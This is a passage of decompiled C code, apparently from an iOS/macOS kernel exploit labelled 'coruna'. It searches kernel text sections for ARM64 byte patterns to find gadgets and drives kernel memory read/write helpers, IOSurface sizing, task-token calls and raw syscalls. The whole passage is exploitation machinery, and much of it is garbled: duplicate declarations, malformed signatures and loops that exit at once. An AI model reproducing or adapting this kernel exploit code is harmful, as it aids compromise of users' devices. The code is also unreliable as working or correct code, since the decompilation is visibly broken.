    handle = handle + 0x28;
  }
  if (handle != 0) {
    u = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,handle,&scratch);
    if ((int)u == 0) {
      return u;
    }
    size = 0xfffffffe;
    if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
      size = 0xf0000000;
    }
    if ((size & scratch) == 0) {
      size = scratch | size;
      if (flags == 0) {
        size = scratch & (size ^ 0xffffffff);
      }
      if ((size != scratch) && (u = coruna_kernel600c_via_mach_vm_machine_attribute(handle,handle), (int)u == 0)) {
        return u;
      }
      return 1;
    }
  }
  return 0;
}





uint64_t coruna_kernel600c_via_find_text_exec_34798(uint64_t val,uint64_t id_2)
{
  int err;
  uint64_t u;
  byte scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  
  bootargs = 0;
  thread_attr = 0;
  u = coruna_find_text_exec_34798(val,&thread_attr,&bootargs);
  if ((int)u != 0) {
    coruna_ctx_test_flag(val,0x5184001);
    err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(val,thread_attr,1,&scratch);
    if ((err == 0) || (1 < scratch)) {
      u = 0;
    }
    else {
      *(bool *)id_2 = scratch != 0;
      u = 1;
    }
  }
  return u;
}





uint64_t coruna_return_zero_34644(uint64_t val,uint size)
{
  byte err;
  uint64_t u;
  int err;
  uint64_t size;
  byte scratch;
  byte bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  
  thread_attr = 0;
  host_info = 0;
  size = coruna_find_text_exec_34798(val,&thread_attr,&host_info);
  if ((int)size == 0) {
    return size;
  }
  err = coruna_ctx_test_flag(val,0x5184001);
  u = host_info;
  size = thread_attr;
  err = (byte)size;
  if (err == 0) {
    err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(val,thread_attr,1,&bootargs);
    if (err == 0) {
      return 0;
    }
    if (1 < bootargs) {
      return 0;
    }
    if (bootargs == size) {
      return 1;
    }
    bootargs = err;
    err = coruna_call_mach_vm_machine_attribute_29df8_1e994(val,size,&bootargs,1);
  }
  else {
    err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(val,host_info,1,&bootargs);
    size = thread_attr;
    if (err == 0) {
      return 0;
    }
    if (1 < bootargs) {
      return 0;
    }
    err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(val,thread_attr,1,&scratch);
    if (err == 0) {
      return 0;
    }
    if (1 < scratch) {
      return 0;
    }
    if ((bootargs != size) &&
       (bootargs = err, err = coruna_vm_deallocate(val,u,&bootargs,1), err == 0)) {
      return 0;
    }
    if (scratch == size) {
      return 1;
    }
    scratch = err;
    err = coruna_vm_deallocate(val,size,&scratch,1);
  }
  if (err == 0) {
    return 0;
  }
  return 1;
}





uint64_t coruna_find_text_exec_34798(long handle,long *addr_2,long *off_3)
{
  char *ptr;
  int err;
  uint64_t u;
  long handle;
  long addr;
  uint8_t scratch[8];
  long bootargs;
  long thread_attr;
  long host_info;
  
  host_info = 0;
  if ((*(long *)(handle + 0x118) == 0) || (*(long *)(handle + 0x120) == 0)) {
    addr = 0;
  }
  else {
    handle = *(long *)(*(long *)(handle + 0x118) + 0x148);
    host_info = handle;
    err = coruna_ctx_test_flag(handle,0x5184001);
    if ((err == 0) && (handle != 0)) {
      *addr_2 = handle;
      return 1;
    }
    addr = *(long *)(*(long *)(handle + 0x118) + 0x140);
    err = coruna_ctx_test_flag(handle,0x5184001);
    if ((err != 0) && (handle != 0 && addr != 0)) {
      *addr_2 = handle;
      *off_3 = addr;
      return 1;
    }
  }
  err = coruna_ctx_test_flag(handle,0x20);
  if (err == 0) {
    err = coruna_ctx_test_flag(handle,0x5184001);
    if (err == 0) {
      coruna_find_ppltext_2ec0c(scratch,handle);
      if (bootargs == 0) {
        return 0;
      }
      if (thread_attr == 0) {
        return 0;
      }
      if (*(unsigned long *)(handle + 0x158) < 0x225c192d100000) {
        handle = coruna_strsep(scratch,"09 FD 9F 08 C0 03 5F D6",0,1);
        if (handle == 0) {
          return 0;
        }
        host_info = coruna_return_zero_15ca0_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0xc);
      }
      else {
        handle = coruna_strsep(scratch,"09 01 00 39 C0 03 5F D6",0,1);
        if (handle == 0) {
          return 0;
        }
        handle = coruna_return_zero_15ca0_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0xc);
        if (handle == 0) {
          return 0;
        }
        host_info = coruna_kernel600c_trampoline_00012ad4(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle);
      }
      if (host_info == 0) {
        return 0;
      }
      handle = 0;
      *addr_2 = host_info;
    }
    else {
      err = *(int *)(handle + 0x140);
      coruna_find_ppltext_2ec0c(scratch,handle);
      if (bootargs == 0) {
        return 0;
      }
      if (thread_attr == 0) {
        return 0;
      }
      ptr = "6B 00 00 37 40 00 00 34";
      if (err < 0x225c) {
        ptr = "6A 00 00 37 40 00 00 34";
      }
      addr = coruna_strsep(scratch,ptr,0,1);
      if (addr == 0) {
        return 0;
      }
      handle = coruna_return_zero_15ca0_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr + -0x10);
      if (handle == 0) {
        return 0;
      }
      host_info = coruna_return_zero_15ca0_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr + -8);
      if (host_info == 0) {
        return 0;
      }
      *addr_2 = host_info;
      addr = handle;
    }
  }
  else {
    coruna_macho_map_segsect(scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle),"__TEXT_EXEC","__text");
    if (bootargs == 0) {
      return 0;
    }
    if (thread_attr == 0) {
      return 0;
    }
    handle = coruna_strsep(scratch,"08 01 40 39 08 01 00 12",0,1);
    if (handle == 0) {
      return 0;
    }
    handle = coruna_return_zero_15ca0_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0xc);
    if (handle == 0) {
      return 0;
    }
    u = coruna_kernel600c_residual_228(handle,handle,&host_info);
    if ((int)u == 0) {
      return u;
    }
    *addr_2 = host_info;
    handle = host_info + -1;
  }
  *off_3 = handle;
  handle = *(long *)(handle + 0x118);
  if ((handle != 0) && (*(long *)(handle + 0x120) != 0)) {
    *(long *)(handle + 0x140) = addr;
    *(long *)(handle + 0x148) = host_info;
  }
  return 1;
}





uint64_t coruna_kernel29d3c_via_host_security_set_task_token(long handle,uint64_t val,int *flags)
{
  uint64_t u;
  int err;
  
  err = *(int *)(&k_kernel_slot_1920 + handle);
  if (err + 1U < 2) {
    u = 0;
  }
  else {
    if (0x1c1b19145fffff < *(unsigned long *)(handle + 0x158)) {
      u = coruna_host_security_set_task_token(handle);
      if ((int)u == 0) {
        return u;
      }
      err = *(int *)(&k_kernel_slot_1920 + handle);
    }
    *flags = err;
    u = 1;
  }
  return u;
}





uint coruna_iosurface_buf_size(long handle)
{
  uint u;
  
  u = *(int *)(handle + 0x180) << 2;
  if (u < 0x4001) {
    u = 0x4000;
  }
  return u >> 1 | 1;
}
uint64_t coruna_kernel600c_via_u64_pack(long handle,uint64_t *val,uint *size)
{
  int err;
  uint64_t u;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  uint64_t kind;
  bool err;
  uint64_t type_id;
  int status;
  
  version = k_kernel_rodata_word_000378a8;
  size = k_kernel_rodata_word_378a0;
  u = k_kernel_rodata_word_37890;
  err = *(int *)(handle + 0x140);
  type_id = 0xffffffff;
  if (err < 0x2258) {
    err = err - 0x1f53U < 2 || err == 0x1809;
    status = 0x1c1b;
  }
  else {
    err = err == 0x2258 || err == 0x2712;
    status = 0x225c;
  }
  if (err || err == status) {
    if (val != (uint64_t *)0x0) {
      if (*size < 0x1b) {
        return 0xffffffff;
      }
      val[1] = k_kernel_rodata_word_00037898;
      *val = u;
      val[3] = version;
      val[2] = size;
      port = k_kernel_rodata_word_000378c8;
      type_id = k_kernel_rodata_word_378c0;
      version = k_kernel_rodata_word_000378b8;
      size = k_kernel_rodata_word_378b0;
      u = coruna_u64_pack((k_kernel_rodata_word_000378f0), (k_kernel_rodata_word_378ec));
      *(uint64_t *)((long)val + 100) = k_kernel_rodata_word_000378f4;
      *(uint64_t *)((long)val + 0x5c) = u;
      kind = k_kernel_rodata_word_378e0;
      tag = k_kernel_rodata_word_378d0;
      u = coruna_u64_pack((k_kernel_rodata_word_378ec), (k_kernel_rodata_word_000378e8));
      val[9] = k_kernel_rodata_word_000378d8;
      val[8] = tag;
      val[0xb] = u;
      val[10] = kind;
      val[5] = version;
      val[4] = size;
      val[7] = port;
      val[6] = type_id;
    }
    type_id = 0;
    *size = 0x1b;
  }
  return type_id;
}





void coruna_kernel600c_via_kernel600c_via_u64_pack(uint64_t val,uint size)
{
  int err;
  uint u;
  unsigned long size;
  uint *ptr;
  uint scratch;
  uint bootargs [64];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0x40;
  err = coruna_kernel600c_via_u64_pack(val,bootargs,&scratch);
  if ((err == 0) && (size = (unsigned long)scratch, scratch != 0)) {
    ptr = bootargs;
    do {
      u = *ptr;
      if (*(long *)k_kernel_stack_chk_guard_slot != thread_attr) {
      ___stack_chk_fail(u);
      }
      return;
    } while (size != 0);
  }
  u = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != thread_attr) {
    ___stack_chk_fail(u);
  }
  return;
}





long coruna_kernel600c_str_08_29_40_92_09_15_80_52(long handle,char *path)
{
  int err;
  long handle;
  long addr;
  char *ptr;
  long off;
  long base;
  bool err;
  char *scratch [4];
  long bootargs;
  long thread_attr;
  uint8_t host_info[24];
  char serial_buf [80];
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  if (*(int *)(handle + 0x140) - 0x1f53U < 2) {
    off = 0xa8;
    base = 0x289;
  }
  else {
    handle = 0;
    off = 0xa8;
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
      off = 0x88;
    }
    base = 0x192;
  }
  handle = *(long *)(&k_kernel_slot_19a0 + handle);
  if (handle == 0) {
    (*(void (*)k_kernel_chkstk_darwin_slot)();
    ptr = "08 29 40 92 09 15 80 52";
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
      ptr = "28 69 68 78 09 11 80 52";
    }
    scratch[1] = (char *)0x0;
    err = true;
    handle = 1;
    scratch[0] = ptr;
    do {
      if (ptr != (char *)0x0) {
        coruna_macho_text_sect(host_info,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
        addr = coruna_strsep(host_info,ptr,0,0);
        if (addr != 0) {
          handle = coruna_return_zero_15ca0_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr + 8);
          if (handle != 0) {
            *(long *)(&k_kernel_slot_19a0 + handle) = handle;
            break;
          }
          handle = 0;
        }
      }
      handle = 0;
      err = false;
      ptr = scratch[handle];
      handle = 2;
    } while( true );
  }
  base = base + -1;
  do {
    handle = off + handle;
    scratch[3] = *(char **)(&k_kernel_slot_19f8 + handle);
    bootargs = handle;
    thread_attr = off;
    addr = coruna_ioservice_open_path(scratch + 3,1);
    if (addr == 0) break;
    coruna_call_mach_vm_machine_attribute_29df8(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr,off,0);
    if (*(long *)(addr + 0x10) != 0) {
      scratch[3] = *(char **)(&k_kernel_slot_19f8 + handle);
      thread_attr = 0x50;
      bootargs = *(long *)(addr + 0x10);
      ptr = (char *)coruna_ioservice_open_path(scratch + 3,0);
      if (ptr == (char *)0x0) {
        ptr = serial_buf;
        serial_buf[0] = '\0';
        coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,*(uint64_t *)(addr + 0x10),0x50,serial_buf);
      }
      else {
        coruna_call_mach_vm_machine_attribute_29df8(*(uint64_t *)(&k_kernel_slot_19f8 + handle),ptr,0x50,0);
      }
      err = _strcmp(path,ptr);
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return handle;
      }
      ___stack_chk_fail();
    }
    base = base + -1;
  } while (base != 0);
fail:
  handle = 0;
done:
  if (*(long *)k_kernel_stack_chk_guard_slot == action) {
    return handle;
  }
  ___stack_chk_fail();
}





uint32_t coruna_macho_data_seg_34e78(long handle,long addr_2)
{
  unsigned long u;
  int err;
  int status;
  long handle;
  uint64_t size;
  uint64_t scratch;
  unsigned long bootargs;
  long thread_attr;
  uint64_t host_info;
  long serial_buf;
  
  host_info = 0;
  if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
    return 0xad008;
  }
  err = *(int *)(handle + 0x140);
  if ((1 < err - 0x1f53U && err != 0x2258) && err != 0x1c1b) {
    return 0x2802c;
  }
  err = coruna_kernel600c_residual_228(handle,addr_2 + 0x28,&serial_buf);
  if (err != 0) {
    if (serial_buf != 0) {
      handle = coruna_ptr_canonicalize(handle);
      if (handle != 0) {
        return 0;
      }
      return 0x28026;
    }
    coruna_macho_map_segsect(&scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle),"__DATA","__data");
    if ((bootargs != 0) && (thread_attr != 0)) {
      u = bootargs;
      do {
        if ((bootargs + thread_attr) - 0x100 <= u) {
          return 0xad011;
        }
        size = coruna_kernel600c_trampoline_00012ad4(scratch,u);
        size = coruna_kernel600c_via_ctx_test_flag_8(handle,size);
        handle = coruna_kptr_in_mapped_range(handle,size);
        if (((handle != 0) && (handle = coruna_kernel600c_trampoline_00012ad4(scratch,u + 8), handle == 0)) &&
           (handle = coruna_kernel600c_trampoline_00012ad4(scratch,u + 0x10), handle == 10)) {
          handle = coruna_kernel600c_trampoline_00012ad4(scratch,u + 0x18);
          if (handle != 0) {
            size = coruna_kernel600c_trampoline_00012ad4(scratch,u + 0x20);
            size = coruna_kernel600c_via_ctx_test_flag_8(handle,size);
            handle = coruna_kptr_in_mapped_range(handle,size);
            if (handle != 0) {
              if (u == 0) {
                return 0xad011;
              }
              err = coruna_mach_vm_machine_attribute(handle,addr_2 + 0x88,0x10000);
              if (err != 0) {
                err = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,u + 0x18,&host_info,8);
                if (err == 0) {
                  return 0x28010;
                }
                err = 0x14;
                while( true ) {
                  coruna_semaphore_timedwait(handle,"_reply_port");
                  status = coruna_kernel600c_residual_228(handle,addr_2 + 0x28,&serial_buf);
                  if (status == 0) {
                    return 0x2800f;
                  }
                  if (serial_buf != 0) break;
                  err = err + -1;
                  if (err == 0) {
                    return 0xad00b;
                  }
                }
                return 0;
              }
              return 0x28010;
            }
          }
        }
        u = u + (long)*(int *)(handle + 0x168);
      } while( true );
    }
  }
  return 0x2800f;
}





uint64_t
void coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_1ec70(long handle,long addr_2,unsigned long arg,unsigned long arg,void (*p,uint64_t val)
{
  uint u;
  int err;
  int status;
  long handle;
  uint64_t size;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  uint64_t type_id;
  uint type_id_8;
  uint scratch;
  unsigned long bootargs;
  long thread_attr;
  uint64_t host_info;
  uint32_t serial_buf;
  int action;
  uint64_t block_ctx;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t stack_guard;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t sa_saved;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t path_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t tmp_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t region;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t plist;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  long url_buf;
  
  url_buf = *(long *)k_kernel_stack_chk_guard_slot;
  action = -1;
  host_info = 0;
  cache_22 = 0;
  plist = 0;
  cache_24 = 0;
  cache_23 = 0;
  type_id_8 = 0x145fffff;
  type_id = 0x2800f;
  cache = 0;
  region = 0;
  cache_21 = 0;
  cache_20 = 0;
  json_buf = 0;
  tmp_buf = 0;
  work = 0;
  frame = 0;
  region = 0;
  path_buf = 0;
  url_buf = 0;
  plist = 0;
  sa_new = 0;
  sa_new = 0;
  tmp_buf = 0;
  path_buf = 0;
  block_ctx = 0;
  sa_saved = 0;
  sa_saved = 0;
  stack_guard = 0;
  host_info = 0;
  stack_guard = 0;
  action = 0;
  serial_buf = 0;
  scratch = 0;
  block_ctx = 0;
  thread_attr = 0;
  bootargs = 0;
  handle = 0x28;
  if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
    handle = 0x20;
  }
  err = coruna_kernel600c_residual_228(handle,handle + addr_2,&thread_attr);
  if (err == 0) {
    size = 0x2800f;
    if (action != -1) {
    coruna_close();
    }
    if (*(long *)k_kernel_stack_chk_guard_slot == url_buf) {
    return size;
    }
    ___stack_chk_fail();
  }
  handle = coruna_ptr_canonicalize(handle,thread_attr);
  if (handle != 0) {
    if (0xff < (int)arg - 1U) {
      size = 0x28011;
      if (action != -1) {
      coruna_close();
      }
      if (*(long *)k_kernel_stack_chk_guard_slot == url_buf) {
      return size;
      }
      ___stack_chk_fail();
    }
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
      bootargs = arg | 1;
done:
      size = coruna_open_dev_null(&action);
      if ((int)size == 0) {
        err = coruna_call_mach_vm_machine_attribute_29df8_1ed48(handle,arg,&block_ctx,arg);
        if (err == 0) {
cleanup:
          size = 0x28010;
        }
        else {
          err = coruna_kernel600c_residual_223();
          size = type_id;
          if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
            err = coruna_call_mach_vm_machine_attribute_29df8_1ec70(handle,thread_attr +
                                         (unsigned long)(uint)(*(int *)(handle + 0x180) * err),
                                 (long)*(int *)(handle + 0x168),&host_info);
            if (action != -1) {
            coruna_close();
            }
            if (*(long *)k_kernel_stack_chk_guard_slot == url_buf) {
            return size;
            }
            ___stack_chk_fail();
          }
          else {
            err = coruna_call_mach_vm_machine_attribute_29df8_1ec70(handle,thread_attr +
                                         (unsigned long)(uint)(*(int *)(handle + 0x180) * err) + 8,
                                 (long)*(int *)(handle + 0x168),&host_info);
            if (action != -1) {
            coruna_close();
            }
            if (*(long *)k_kernel_stack_chk_guard_slot == url_buf) {
            return size;
            }
            ___stack_chk_fail();
          }
          size = 0x28026;
        }
      }
      if (action != -1) {
      coruna_close();
      }
      if (*(long *)k_kernel_stack_chk_guard_slot == url_buf) {
      return size;
      }
      ___stack_chk_fail();
    }
    err = 0;
    version = arg & 0xffffffff;
    bootargs = arg + version * -0x400;
    port = arg;
    tag = arg;
    kind = arg;
    do {
      if ((*(unsigned long *)(handle + 0x188) & kind) == 0) {
        bootargs = tag;
        if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
          bootargs = port | 1;
        }
        {
          size = coruna_open_dev_null(&action);
          if ((int)size == 0) {
          err = coruna_call_mach_vm_machine_attribute_29df8_1ed48(handle,arg,&block_ctx,arg);
          if (err == 0) {
          cleanup:
          size = 0x28010;
          }
          else {
          err = coruna_kernel600c_residual_223();
          size = type_id;
          if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
          err = coruna_call_mach_vm_machine_attribute_29df8_1ec70(handle,thread_attr +
          (unsigned long)(uint)(*(int *)(handle + 0x180) * err),
          (long)*(int *)(handle + 0x168),&host_info);
          if (action != -1) {
          coruna_close();
          }
          if (*(long *)k_kernel_stack_chk_guard_slot == url_buf) {
          return size;
          }
          ___stack_chk_fail();
          }
          else {
          err = coruna_call_mach_vm_machine_attribute_29df8_1ec70(handle,thread_attr +
          (unsigned long)(uint)(*(int *)(handle + 0x180) * err) + 8,
          (long)*(int *)(handle + 0x168),&host_info);
          if (action != -1) {
          coruna_close();
          }
          if (*(long *)k_kernel_stack_chk_guard_slot == url_buf) {
          return size;
          }
          ___stack_chk_fail();
          }
          size = 0x28026;
          }
          }
          if (action != -1) {
          coruna_close();
          }
          if (*(long *)k_kernel_stack_chk_guard_slot == url_buf) {
          return size;
          }
          ___stack_chk_fail();
        }
      }
      kind = kind - version;
      tag = tag + (1 - version);
      port = port + (4 - version);
      err = err + 1;
    } while (err != 0x400);
  }
  size = 0x28026;
fail:
  if (action != -1) {
    coruna_close();
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == url_buf) {
    return size;
  }
  ___stack_chk_fail();
}





uint64_t
void coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_1ec70_2(long handle,long addr_2,unsigned long arg,unsigned long *arg,void (*p,uint64_t val
            )
{
  uint u;
  uint size;
  uint version;
  int err;
  int status;
  long handle;
  uint64_t port;
  uint64_t tag;
  uint scratch;
  unsigned long bootargs;
  long thread_attr;
  uint64_t host_info;
  uint32_t scratch;
  int serial_buf;
  
  tag = 0x2800f;
  serial_buf = -1;
  host_info = 0;
  handle = 0x28;
  if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
    handle = 0x20;
  }
  err = coruna_kernel600c_residual_228(handle,handle + addr_2,&thread_attr);
  if (err == 0) {
    port = 0x2800f;
  }
  else {
    handle = coruna_ptr_canonicalize(handle,thread_attr);
    if (handle == 0) {
      port = 0x28026;
    }
    else {
      port = coruna_open_dev_null(&serial_buf);
      if ((int)port == 0) {
        err = coruna_kernel600c_residual_223();
        if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
          port = 0xad008;
        }
        else {
          err = coruna_call_mach_vm_machine_attribute_29df8_1ec70(handle,thread_attr + (unsigned long)(uint)(*(int *)(handle + 0x180) * err) +
                                       8,(long)*(int *)(handle + 0x168),&host_info);
          port = tag;
          if (err != 0) {
            handle = coruna_ptr_canonicalize(handle,host_info);
            if (handle == 0) {
              port = 0x28026;
            }
            else {
              err = coruna_kernel600c_residual_223();
              status = coruna_call_mach_vm_machine_attribute_29df8_1ec70(handle,thread_attr +
                                           (unsigned long)(uint)(*(int *)(handle + 0x180) * err),4,
                                   &scratch);
              if (status != 0) {
                do {
                  version = scratch;
                  u = scratch & 0xffff;
                  size = u;
                  if (u == 0) {
                    if (0xffff < scratch) {
                      size = scratch >> 0x10;
                      if (7 < (uint)((unsigned long)size - 1)) {
                      port = 0x28011;
                      break;
                      }
                      handle = 0x10;
                      if (u != 0) {
                      handle = 8;
                      }
                      status = coruna_call_mach_vm_machine_attribute_29df8_1ec70(handle,thread_attr + handle +
                      (unsigned long)(uint)(*(int *)(handle + 0x180) * err),4,
                      &scratch);
                      port = tag;
                      if (status == 0) break;
                    }
                    if ((arg != (void (*)0x0) &&
                       (port = (*arg)(handle,val), (int)port != 0)) break;
                  }
                  else {
fail:
                    if (7 < (uint)((unsigned long)size - 1)) {
                      port = 0x28011;
                      break;
                    }
                    handle = 0x10;
                    if (u != 0) {
                      handle = 8;
                    }
                    status = coruna_call_mach_vm_machine_attribute_29df8_1ec70(handle,thread_attr + handle +
                                                 (unsigned long)(uint)(*(int *)(handle + 0x180) * err),4,
                                         &scratch);
                    port = tag;
                    if (status == 0) break;
                    host_info = coruna_u64_pack((host_info), (scratch));
                    bootargs = 0;
                    status = coruna_call_mach_vm_machine_attribute_29df8_1ec70(handle,host_info +
                                                 (long)*(int *)(handle + 0x168) *
                                                 ((unsigned long)size - 1),(long)*(int *)(handle + 0x168),
                                         &bootargs);
                    if (status == 0) break;
                    handle = coruna_ptr_canonicalize(handle,bootargs &
                                                 (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff))
                    ;
                    if (handle != 0) {
                      bootargs = (bootargs & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff)) +
                                 (*(unsigned long *)(handle + 0x188) & bootargs) * (arg & 0xffffffff);
                      scratch = (version & 0xffff0000) - 0x10000;
                      if (u != 0) {
                        scratch = version & 0xffff0000;
                        version = version - 1;
                      }
                      scratch = scratch | version & 0xffff;
                      status = coruna_kernel600c_residual_223();
                      if (status == err) {
                        err = coruna_call_mach_vm_machine_attribute_29df8_1ed48(handle,thread_attr +
                                                     (unsigned long)(uint)(*(int *)(handle + 0x180) * err
                                                                  ),&scratch,4);
                        if (err == 0) {
                          port = 0x28010;
                        }
                        else {
                          *arg = bootargs;
                          port = 0;
                        }
                        break;
                      }
                    }
                  }
                  err = coruna_kernel600c_residual_223();
                  status = coruna_call_mach_vm_machine_attribute_29df8_1ec70(handle,thread_attr +
                                               (unsigned long)(uint)(*(int *)(handle + 0x180) * err),4,
                                       &scratch);
                  port = tag;
                } while (status != 0);
              }
            }
          }
        }
      }
    }
  }
  if (serial_buf != -1) {
    coruna_close();
  }
  return port;
}





int coruna_syscall(void)
{
  int err;
  
  err = _syscall(0x17d);
  return err;
}





int coruna_mac_syscall(void)
{
  int err;
  
  err = _syscall(0x1cd);
  return err;
}





int coruna_mac_syscall_35844(void)
{
  int err;
  
  err = _syscall(0x206);
  return err;
}





unsigned long coruna_cpu_capabilities_base(void)

{
  return *(unsigned long *)(k_kernel_get_cpu_capabilities_slot + 0xc) & 0xffffffffffffff00;
}

